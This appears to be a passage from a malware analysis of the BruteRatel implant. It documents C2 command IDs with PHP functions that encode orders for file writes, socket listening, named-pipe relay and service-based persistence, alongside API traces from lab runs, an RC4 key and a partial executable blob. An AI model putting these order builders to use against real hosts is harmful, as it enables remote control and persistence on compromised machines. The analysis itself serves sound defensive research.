[PTP] [0x688] [0xe8] [c:\windows\system32\rundll32.exe]
[API] <GetSystemTime> in [KERNEL32.DLL] 
[PAR] LPSYSTEMTIME lpSystemTime : 0x000000CFC02BECF0
[RET] [0xcfc030c1b9]

[CNT] [1515]
[PTP] [0x688] [0xe8] [c:\windows\system32\rundll32.exe]
[API] <SystemTimeToTzSpecificLocalTime> in [KERNEL32.DLL] 
[RET] [0xcfc030c1cc]

[CNT] [1531]
[PTP] [0x688] [0xe8] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringW> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x000000CFBE4C2680
[STR]        -> "19-03-2025_16-42-44_autorunsc64.exe"
[PAR] DWORD  cbBinary   : 0x46
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPWSTR pszString  : 0x000000CFBE4D9DC0
[PAR] DWORD* pcchString : 0x000000CFC02BEBFC
[RET] [0xcfc031e028]

[CNT] [1534]
[PTP] [0x688] [0xe8] [c:\windows\system32\rundll32.exe]
[API] <CreateFileW> in [KERNEL32.DLL] 
[PAR] LPCWSTR lpFileName            : 0x000000CFBE4DC6A0
[STR]         -> "autorunsc64.exe"
[PAR] DWORD   dwDesiredAccess       : 0x80000000 (GENERIC_READ)
[PAR] DWORD   dwCreationDisposition : 0x3 (OPEN_EXISTING)
[RET] [0xcfc030c278]

[CNT] [1535]
[PTP] [0x688] [0xe8] [c:\windows\system32\rundll32.exe]
[API] <GetFileSizeEx> in [KERNEL32.DLL] 
[PAR] HANDLE         hFile      : 0x364
[PAR] PLARGE_INTEGER lpFileSize : 0x000000CFC02BECA8
[RET] [0xcfc030c293]

[CNT] [1550]
[PTP] [0x688] [0xe8] [c:\windows\system32\rundll32.exe]
[API] <ReadFile> in [KERNEL32.DLL] 
[PAR] HANDLE hFile                : 0x364
[PAR] LPVOID lpBuffer             : 0x000000CFBE4F3320
[PAR] DWORD  nNumberOfBytesToRead : 0x2710
[RET] [0xcfc030c3a8]


```

**III. Result**   

```html
[CNT] [1566]
[PTP] [0x688] [0xe8] [c:\windows\system32\rundll32.exe]
[API] <SystemFunction032> in [CRYPTSP.DLL] 
[INF] [ Undocumented RC4 implementation ]
[PAR] PBINARY_STRING buffer : 0x000000CFC02BEAE0
[FLD]                -> Length    = 0x34ed
[FLD]                -> MaxLength = 0x34ed
[FLD]                -> Buffer    = 0x000000CFBE4F8E70
[STR]                -> "{"cds":{"auth":"OV1T557KBIUECUM5"},"dt":{"chkin":"TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
[STR]                   "AAAAAAAAAAIAEAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAAB+XYtDOjzlEDo85RA6PO"
[STR]                   "UQcUTmET885RBxROARljzlEC9D4BF6POUQL0PhESg85RAvQ+YRMzzlEHFE4REqPOUQcUTjETg85RBxROQRJTzlEDo85BB4PeUQALzhETk85RAAvOARGzzlEA"
[STR]                   "C8GhA7POUQOjxyEDs85RAAvOcROzzlEFJpY2g6POUQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAUEUAAGSGBwCKc7tlAAAAAAAAAADwACIACwIOJQBYBwAA+A"
[STR]                   "QAAAAAAADHBAAAEAAAAAAAQAEAAAAAEAAAAAIAAAYAAAAAAAAABgAAAAAAAAAAkAwAAAQAADp0DAADAGCBAAAQAAAAAAAAEAAAAAAAAAAAEAAAAAAAABAAAA"
[STR]                   "AAAAAAAAAAEAAAAAAAAAAAAAAAIPAJAEABAAAA0AoAYKMBAACACgAgPQAAAB4MACAoAAAAgAwAQAkAALBOCQBUAAAAAAAAAAAAAAAAAAAAAAAAAIBPCQAoAA"
[STR]                   "AAcE0JAEABAAAAAAAAAAAAAABwBwBACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALnRleHQAAADcVgcAABAAAABYBwAABAAAAAAAAAAAAAAAAAAAIAAAYC"
[STR]                   "5yZGF0YQAABpwCAABwBwAAngIAAFwHAAAAAAAAAAAAAAAAAEAAAEAuZGF0YQAAAMRrAAAAEAoAADYAAAD6CQAAAAAAAAAAAAAAAABAAADALnBkYXRhAAAgPQ"
[STR]                   "AAAIAKAAA+AAAAMAoAAAAAAAAAAAAAAAAAQAAAQF9SREFUQQAAXAEAAADACgAAAgAAAG4KAAAAAAAAAAAAAAAAAEAAAEAucnNyYwAAAGCjAQAA0AoAAKQBAA"
[STR]                   "BwCgAAAAAAAAAAAAAAAABAAABALnJlbG9jAABACQAAAIAMAAAKAAAAFAwAAAAAAAAAAAAAAAAAQAAAQgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
[STR]                   "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
[STR]                   "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEBTSIPsIDPJ/xW6YQcASIvIul"
[STR]                   "gAAABIi9j/FZlhBwC6WgAAAEiLy4kFMzYKAP8VhWEHAEiLy4kFKDYKAEiDxCBbSP8leGEHAMzMzMzMzMzMSIPsOLpAAAAASI0FIDABAEyNDTkvAQBIiUQkIE"
[STR]                   "iNDR1QCgBEjULU6FCvBABIjQ2tUAcASIPEOOm4sgQAzMzMzEiNDblQBwDpqLIEAMzMzMxIg+woSI0NNQwIAOiYjAUAM8lIiQXvVAoA6G6MBQBIjQ37UAcASI"
[STR]                   [TRUNCATED]
[PAR] PBINARY_STRING key    : 0x000000CFC02BEAD0
[FLD]                -> Length    = 0x10
[FLD]                -> MaxLength = 0x10
[FLD]                -> Buffer    = 0x000000CFBE4ACFF0
[STR]                -> "S47EFEUO3D2O6641"
[RET] [0xcfc0304c35]
```

<a id="RegEnumKeyA"></a>
# RegEnumKeyA  

```php
/*
	$hKey : 
	"1" = HKEY_LOCAL_MACHINE
	"2" = HKEY_CURRENT_USER
	"3" = HKEY_CLASSES_ROOT
	"4" = HKEY_CURRENT_CONFIG
	else = HKEY_USERS
*/
function RegEnumKeyA($hKey, $SubKey)
{

	$cmd_id = "\x36\x6c $hKey $SubKey";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html
[CNT] [395]
[PTP] [0x6e4] [0x2ec] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x000000545977D7F0
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+WubiSNMxHCzZpQz7Gj9p+2kYThEKttPdJ93wJSknM5COFwTQt4Y7KLXHYvGvE73JL7J/ubGGZNw2Gu2vFrLbSoclGaE8NSGY"
[STR]            "7WVNjGB2g1yCSXANHWR2zTJ5Io/dvg=="
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x0000005459758AB0
[PAR] DWORD   *pcbBinary : 0x000000545B68EC7C
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0x545b5ebea1]
```

**II. Execution**   

```html
[CNT] [418]
[PTP] [0x6e4] [0x420] [c:\windows\system32\rundll32.exe]
[API] <RegOpenKeyExA> in [ADVAPI32.dll] 
[PAR] HKEY    hKey       : 0x80000001 (HKEY_CURRENT_USER)
[PAR] LPCTSTR lpSubKey   : 0x0000005459766A20
[STR]         -> "Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths"
[PAR] DWORD   ulOptions  : 0x0
[PAR] REGSAM  samDesired : 0x20019 (KEY_READ)
[PAR] PHKEY   phkResult  : 0x000000545BBFF2B8
[RET] [0x545b5f9ef2]

[CNT] [419]
[PTP] [0x6e4] [0x420] [c:\windows\system32\rundll32.exe]
[API] <RegQueryInfoKeyW> in [ADVAPI32.dll] 
[PAR] HKEY      hKey                   : 0x2fc 
[PAR] LPWSTR    lpClass                : 0x0
[PAR] LPDWORD   lpcchClass             : 0x0
[PAR] LPDWORD   lpReserved             : 0x0
[PAR] LPDWORD   lpcSubKeys             : 0x000000545BBFF290
[PAR] LPDWORD   lpcbMaxSubKeyLen       : 0x0
[PAR] LPDWORD   lpcbMaxClassLen        : 0x0
[PAR] LPDWORD   lpcValues              : 0x000000545BBFF294
[PAR] LPDWORD   lpcbMaxValueNameLen    : 0x0
[PAR] LPDWORD   lpcbMaxValueLen        : 0x0
[PAR] LPDWORD   lpcbSecurityDescriptor : 0x0
[PAR] PFILETIME lpftLastWriteTime      : 0x0
[RET] [0x545b5f9f64]

[CNT] [434]
[PTP] [0x6e4] [0x420] [c:\windows\system32\rundll32.exe]
[API] <RegEnumValueW> in [ADVAPI32.dll] 
[RET] [0x545b5fa149]

[CNT] [436]
[PTP] [0x6e4] [0x420] [c:\windows\system32\rundll32.exe]
[API] <RegQueryValueExW> in [ADVAPI32.dll] 
[PAR] HKEY    hKey        : 0x2fc 
[PAR] LPCWSTR lpValueName : 0x000000545978E520
[STR]         -> "url1"
[PAR] LPBYTE  lpData      : 0x000000545977FDA0
[PAR] LPDWORD lpcbData    : 0x000000545BBFF2A0
[RET] [0x545b5fa486]

[...]
```

**III. Result**   

```html
[CNT] [444]
[PTP] [0x6e4] [0x420] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringW> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x000000545975A520
[STR]        -> "366C"
[STR]           "AB 2|url1?C:\Windows\System32|url2?C:\Windows|"
[PAR] DWORD  cbBinary   : 0x66
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPWSTR pszString  : 0x0000005459748C50
[PAR] DWORD* pcchString : 0x000000545BBFF19C
[RET] [0x545b5ee028]
```

<a id="QueryServiceConfig"></a>
# QueryServiceConfig  

```php
/*
	$MachineName : can be NULL (LocalComputer)
	$param 2 : "full" or nothing (OPTIONAL) ?
	$param 3 : service Name (OPTIONAL)
	Query All services or just the one specified
*/
function QueryServiceConfig($MachineName, $p2, $ServiceName)
{

	$cmd_id = "\x58\xb4 $MachineName $p2 $ServiceName";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html
[CNT] [327]
[PTP] [0xbdc] [0x8f0] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x00000079B1BA5EF0
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+Q8fESNcfBEnZ0CGsL2N97WALbAsIj8SZac7/JBB0"
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x00000079B1BA9080
[PAR] DWORD   *pcbBinary : 0x00000079B3AAE97C
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0x79b3a0bea1]
```

**II. Execution**   

```html
[CNT] [359]
[PTP] [0xbdc] [0x5c8] [c:\windows\system32\rundll32.exe]
[API] <OpenSCManagerA> in [ADVAPI32.dll] 
[PAR] LPCSTR  lpMachineName   : 0x0 (null)
[PAR] LPCSTR  lpDatabaseName  : 0x0 (null)
[PAR] DWORD   dwDesiredAccess : 0x4 (SC_MANAGER_ENUMERATE_SERVICE)
[RET] [0x79b3a1d9d5]

[CNT] [370]
[PTP] [0xbdc] [0x5c8] [c:\windows\system32\rundll32.exe]
[API] <OpenServiceW> in [ADVAPI32.dll] 
[PAR] SC_HANDLE hSCManager      : 0xb1bc4740 
[PAR] LPCWSTR   lpServiceName   : 0x00000079B1BB0AE0
[STR]           -> "BthHFSrv"
[PAR] DWORD     dwDesiredAccess : 0x5 (SERVICE_QUERY_CONFIG | SERVICE_QUERY_STATUS)
[RET] [0x79b3a1d523]

[CNT] [372]
[PTP] [0xbdc] [0x5c8] [c:\windows\system32\rundll32.exe]
[API] <QueryServiceConfigW> in [ADVAPI32.dll] 
[PAR] SC_HANDLE               hService        : 0x00000079B1BC4890
[PAR] LPQUERY_SERVICE_CONFIGW lpServiceConfig : 0x00000079B1BC8900
[PAR] DWORD                   cbBufSize       : 0x1aa
[PAR] LPDWORD                 pcbBytesNeeded  : 0x00000079B401EDC4
[RET] [0x79b3a1d578]

[CNT] [373]
[PTP] [0xbdc] [0x5c8] [c:\windows\system32\rundll32.exe]
[API] <QueryServiceStatus> in [ADVAPI32.dll] 
[PAR] SC_HANDLE        hService        : 0x00000079B1BC4890
[PAR] LPSERVICE_STATUS lpServiceStatus : 0x00000079B401EDF4
[RET] [0x79b3a1d598]

[CNT] [381]
[PTP] [0xbdc] [0x5c8] [c:\windows\system32\rundll32.exe]
[API] <QueryServiceConfig2W> in [ADVAPI32.dll] 
[PAR] SC_HANDLE hService       : 0x00000079B1BC4890
[PAR] DWORD     dwInfoLevel    : 0x1 (SERVICE_CONFIG_DESCRIPTION)
[PAR] LPBYTE    lpBuffer       : 0x00000079B1BA2F80
[PAR] DWORD     cbBufSize      : 0x17a
[PAR] LPDWORD   pcbBytesNeeded : 0x00000079B401EDCC
[RET] [0x79b3a1d6a1]

[CNT] [383]
[PTP] [0xbdc] [0x5c8] [c:\windows\system32\rundll32.exe]
[API] <QueryServiceConfig2W> in [ADVAPI32.dll] 
[PAR] SC_HANDLE hService       : 0x00000079B1BC4890
[PAR] DWORD     dwInfoLevel    : 0x8 (SERVICE_CONFIG_TRIGGER_INFO)
[PAR] LPBYTE    lpBuffer       : 0x00000079B1BC53F0
[PAR] DWORD     cbBufSize      : 0x48
[PAR] LPDWORD   pcbBytesNeeded : 0x00000079B401EDC8
[RET] [0x79b3a1d718]

[CNT] [384]
[PTP] [0xbdc] [0x5c8] [c:\windows\system32\rundll32.exe]
[API] <UuidToStringW> in [RPCRT4.dll] 
[RET] [0x79b3a1d774]
```

**III. Result**   

```html
[CNT] [401]
[PTP] [0xbdc] [0x5c8] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringW> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x00000079B1B864B0
[STR]        -> "58B4"
[STR]           "home"
[STR]           "BthHFSrv|Service mains libres Bluetooth|1|C:\Windows\System32\svchost.exe -k LocalServiceAndNoImpersonation|NT AUTHORITY"
[STR]           "\LocalService|32|3Permet d’utiliser des casques Bluetooth sans fil sur cet ordinateur. Si ce service est arrêté ou désac"
[STR]           "tivé, les casques Bluetooth ne fonctionneront pas correctement sur cet ordinateur.|1 1 bd41df2d-addd-4fc9-a194-b9881d2a2"
[STR]           "efa|"
[PAR] DWORD  cbBinary   : 0x2ee
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPWSTR pszString  : 0x00000079B1BA2F80
[PAR] DWORD* pcchString : 0x00000079B401EDCC
[RET] [0x79b3a0e028]
```

<a id="unknown3"></a>
# unknown3  

```php
function maybe_push_cmd($p1 $p2)
{
	$p2_b64 = base64_encode($p2);
	
	$cmd_id = "\xea\xe2 $p1 $p2_b64";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

I still need to figure this one out, this command is expecting some base64 encoded data from the C2 that is going to be stored into an internal structure.



<a id="WriteFile"></a>
# WriteFile  

```php
function WriteFile($filename, $data)
{
	$data_b64 = base64_encode($data);
	
	$cmd_id = "\xa1\x13 $filename $data_b64";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html
[CNT] [327]
[PTP] [0x2d8] [0xbf4] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x000000D88DC99660
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+e9nYSP0fMg/hxGP7G0V+5WYafAgKjNvwFIDoGD4lO8WCYCbmifBuQoKhft6dMaHDJrAiyoSsfO0DffLkWP7ie4FQ"
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x000000D88DCB4490
[PAR] DWORD   *pcbBinary : 0x000000D88FC6E57C
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0xd88fbcbea1]
```

**II. Execution**   

```html
[CNT] [336]
[PTP] [0x2d8] [0xbf4] [c:\windows\system32\rundll32.exe]
[API] <CreateFileA> in [KERNEL32.DLL] 
[PAR] LPCTSTR lpFileName            : 0x000000D88DCAA920
[STR]         -> "pipe.txt"
[PAR] DWORD   dwDesiredAccess       : 0x40000000 (GENERIC_WRITE)
[PAR] DWORD   dwCreationDisposition : 0x2 (CREATE_ALWAYS)
[RET] [0xd88fbe1dd1]

[ * ] [pid 0x2d8][tid 0xbf4] c:\windows\system32\rundll32.exe
[EVT] [Kernel Monitoring]
[MSG] [FILE_CREATED] [pipe.txt]

[CNT] [338]
[PTP] [0x2d8] [0xbf4] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x000000D88DCAA9A0
[STR]         -> "Q2VjaSBuJ2VzdCBwYXMgdW5lIHBpcGUK"
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x000000D88DCC51B0
[PAR] DWORD   *pcbBinary : 0x000000D88FC6E40C
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0xd88fbcbea1]

[CNT] [339]
[PTP] [0x2d8] [0xbf4] [c:\windows\system32\rundll32.exe]
[API] <WriteFile> in [KERNEL32.DLL] 
[PAR] HANDLE       hFile                  : 0x2f4
[PAR] LPVOID       lpBuffer               : 0x000000D88DCC51B0
[PAR] DWORD        nNumberOfBytesToWrite  : 0x18
[PAR] LPDWORD      lpNumberOfBytesWritten : 0x000000D88FC6E48C
[PAR] LPOVERLAPPED lpOverlapped           : 0x0
[RET] [0xd88fbe1e0d]
```

**III. Result**   

```html
[CNT] [353]
[PTP] [0x2d8] [0xbf4] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringW> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x000000D88DCC5570
[STR]        -> "A113"
[STR]           "24 pipe.txt"
[PAR] DWORD  cbBinary   : 0x20
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPWSTR pszString  : 0x000000D88DC9AC20
[PAR] DWORD* pcchString : 0x000000D88FC6E3AC
[RET] [0xd88fbce028]
```

<a id="listen"></a>
# listen  

```php
function listen($label, $port)
{
	
	$cmd_id = "\x9a\x69 $label $port";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

This command is opening a socket litening for incoming connection on the specified port.  
Here, I ordered the malware to listen from incoming connection on the 80 port and just poped a firefox on 127.0.0.1:80 as a POC.  

**I. Fetching the order**  

```html
[CNT] [327]
[PTP] [0xad8] [0xacc] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x000000B89840EC40
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+eeb+SNMMB033/R/6ME4b+n0KeyolpcTDCqr/bl9pIIS7GA=="
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x000000B8983F6B80
[PAR] DWORD   *pcbBinary : 0x000000B89A2DE94C
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0xb89a23bea1]
```

**II. Execution**   

```html
[CNT] [356]
[PTP] [0xad8] [0xb04] [c:\windows\system32\rundll32.exe]
[API] <getaddrinfo> in [ws2_32.dll] 
[PAR] PCSTR      pNodeName    : 0x0 (null)
[PAR] PCSTR      pServiceName : 0x000000B8983FDED0
[STR]            -> "80"
[PAR] ADDRINFOA  *pHints      : 0x000000B89A84EE30
[FLD] PADDRINFOW    pAddrInfo : 0x000000B89A84EE30
[FLD]               -> ai_flags     = 0x1 (AI_PASSIVE)
[FLD]               -> ai_family    = 0x2 (AF_INET) (IPv4)
[FLD]               -> ai_socktype  = 0x1 (SOCK_STREAM)
[FLD]               -> ai_protocol  = 0x6 (IPPROTO_TCP)
[FLD]               -> ai_addrlen   = 0x0
[FLD]               -> ai_canonname = 0x0 (null)
[FLD]               -> *ai_addr     = 0x0000000000000000
[FLD]               -> *ai_next     = 0x0000000000000000
[PAR] PADDRINFOA *ppResult    : 0x000000B89A84EE18
[RET] [0xb89a250b40]

[CNT] [358]
[PTP] [0xad8] [0xb04] [c:\windows\system32\rundll32.exe]
[API] <socket> in [ws2_32.dll] 
[PAR] int address_family : 0x2 (AF_INET) (IPv4)
[PAR] int type           : 0x1 (SOCK_STREAM)
[PAR] int protocol       : 0x6 (IPPROTO_TCP)
[RET] [0xb89a250b67]

[CNT] [360]
[PTP] [0xad8] [0xb04] [c:\windows\system32\rundll32.exe]
[API] <bind> in [ws2_32.dll] 
[PAR] SOCKET          s       : 0x2dc
[PAR] struct sockaddr *name   : 0x000000B8983FE110
[FLD]          -> sin_family   : 2 (IPv4)
[FLD]          -> sin_port     : 20480 (Little endian : 80)
[FLD]          -> sin_addr     : 0.0.0.0
[PAR] int             namelen : 0x10
[RET] [0xb89a250b94]

[CNT] [361]
[PTP] [0xad8] [0xb04] [c:\windows\system32\rundll32.exe]
[API] <listen> in [ws2_32.dll] 
[PAR] SOCKET s       : 0x2dc
[PAR] int    backlog : 0x2dc
[RET] [0xb89a250baa]

[CNT] [370]
[PTP] [0xad8] [0xb04] [c:\windows\system32\rundll32.exe]
[API] <accept> in [ws2_32.dll] 
[PAR] SOCKET    s       : 0x2dc
[PAR] sockaddr* addr    : 0x000000B89A84EE20
[PAR] int*      addrlen : 0x000000B89A84EDFC
[RET] [0xb89a250c0e]

[CNT] [3168]
[PTP] [0x8ec] [0x81c] [c:\windows\system32\rundll32.exe]
[API] <inet_ntoa> in [ws2_32.dll] 
[PAR] struct in_addr in : 0x100007f
            -> 127.0.0.1
[RET] [0x54a5580c38]

[CNT] [3193]
[PTP] [0x8ec] [0x81c] [c:\windows\system32\rundll32.exe]
[API] <recv> in [ws2_32.dll] 
[PAR] SOCKET s      : 0x3ec
[PAR] char   *buf   : 0x00000054A5B7DFCF
[PAR] int    len    : 0x1000
[RET] [0x54a5555b6b]

[CNT] [3195]
[PTP] [0x8ec] [0x81c] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x00000054A363CE30
[STR]         -> "GET / HTTP/1.1"
[STR]            "Accept: text/html, application/xhtml+xml, */*"
[STR]            "Accept-Language: fr-FR"
[STR]            "User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko"
[STR]            "Accept-Encoding: gzip, deflate"
[STR]            "Host: 127.0.0.1"
[STR]            "DNT: 1"
[STR]            "Connection: Keep-Alive"
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x00000054A360C180
[PAR] DWORD   *pcbBinary : 0x00000054A5B7DE7C
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0x54a556bea1]

[CNT] [3196]
[PTP] [0x8ec] [0x81c] [c:\windows\system32\rundll32.exe]
[API] <send> in [ws2_32.dll] 
[PAR] SOCKET s    : 0x3ec
[PAR] char   *buf : 0x00000054A5588E3B
[STR]        -> ""
[PAR] int    len  : 0x2
[RET] [0x54a5555c30]
```

**III. Result**   

```html
[CNT] [3186]
[PTP] [0x8ec] [0x81c] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringW> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x00000054A3622DB0
[STR]        -> "9A69"
[STR]           "13 LABEL:80 127.0.0.1"
[PAR] DWORD  cbBinary   : 0x46
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPWSTR pszString  : 0x00000054A363ADD0
[PAR] DWORD* pcchString : 0x00000054A5B7EF9C
[RET] [0x54a556e028]
```

<a id="pipe_com_todo"></a>
# pipe_com_todo  

Requires an already opened named pipe.
It is very likely a way to allow infected host without internet access to fetch orders and report back through named pipe to an internet connected host.

```php
function pipe_com_todo($PipeName, $p2)
{
	
	$cmd_id = "\x4d\x3c $PipeName $p2";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html
[CNT] [327]
[PTP] [0x714] [0x2c8] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x0000009A978BBFE0
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+QN/iSPw1Z0jjpRCtHUpD9WkYDy8PqdPCHLiHPhIeGZ+USzqRiYA/JvrWW8Kodg=="
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x0000009A978C2C20
[PAR] DWORD   *pcbBinary : 0x0000009A997CEBAC
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0x9a9972bea1]
```

**II. Execution**   

```html
[CNT] [350]
[PTP] [0x714] [0x7b8] [c:\windows\system32\rundll32.exe]
[API] <CreateFileA> in [KERNEL32.DLL] 
[PAR] LPCTSTR lpFileName            : 0x0000009A978DB250
[STR]         -> "not_a_pipe_its_a_file.txt"
[PAR] DWORD   dwDesiredAccess       : 0xc0000000 (GENERIC_READ | GENERIC_WRITE)
[PAR] DWORD   dwCreationDisposition : 0x3 (OPEN_EXISTING)
[RET] [0x9a997288c9]

[CNT] [353]
[PTP] [0x714] [0x7b8] [c:\windows\system32\rundll32.exe]
[API] <SetNamedPipeHandleState> in [KERNEL32.DLL] 
[PAR] HANDLE  hNamedPipe           : 0x2b0
[PAR] LPDWORD lpMode               : 0x0000009A99D3F274
[FLD]          -> Mode = 0x0 (PIPE_WAIT | PIPE_READMODE_BYTE | PIPE_TYPE_BYTE | PIPE_ACCEPT_REMOTE_CLIENTS)
[PAR] LPDWORD lpMaxCollectionCount : 0x0
[PAR] LPDWORD lpCollectDataTimeout : 0x0
[RET] [0x9a997288f2]
```


<a id="install_as_service"></a>
# install_as_service  

Download a base64 encoded binary, store it under C:\Windows and install it as an autostart service.
The name of the binary has to be the name of the service as well as it's display name, which could be an easy way to identify services created this way by BruteRatel.  

```php
function install_as_service($MachineName, $serviceName, $payload)
{
	$payload_b64 = base64_encode($payload);
	$dropPath = "C:\\Windows\\$serviceName.exe";
	
	$cmd_id = "\x37\xfe $MachineName $dropPath $serviceName $payload_b64";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html
[CNT] [327]
[PTP] [0x998] [0x978] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x0000008CACDF6280
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+WqShSP8fZwzhxBSPMWFX2lIZAzQJ0vneHanoYRIeFoaCfQDJpIZUKbehbdKSe5P3O7IAwai8WsQEfLHgWP7ie4FQ"
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x0000008CACE08B90
[PAR] DWORD   *pcbBinary : 0x0000008CAEDFE7DC
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0x8caed5bea1]
```

**II. Execution**   

```html
[CNT] [356]
[PTP] [0x998] [0x6e0] [c:\windows\system32\rundll32.exe]
[API] <CreateFileA> in [KERNEL32.DLL] 
[PAR] LPCTSTR lpFileName            : 0x0000008CACDF7090
[STR]         -> "C:\Windows\evil.exe"
[PAR] DWORD   dwDesiredAccess       : 0x40000000 (GENERIC_WRITE)
[PAR] DWORD   dwCreationDisposition : 0x2 (CREATE_ALWAYS)
[RET] [0x8caed684bb]

[CNT] [357]
[PTP] [0x998] [0x6e0] [c:\windows\system32\rundll32.exe]
[API] <WriteFile> in [KERNEL32.DLL] 
[PAR] HANDLE       hFile                  : 0x2c8
[PAR] LPVOID       lpBuffer               : 0x0000008CACDDC000
[PAR] DWORD        nNumberOfBytesToWrite  : 0x7
[PAR] LPDWORD      lpNumberOfBytesWritten : 0x0000008CAF36EC48
[PAR] LPOVERLAPPED lpOverlapped           : 0x0
[RET] [0x8caed684e9]

[CNT] [376]
[PTP] [0x998] [0x6e0] [c:\windows\system32\rundll32.exe]
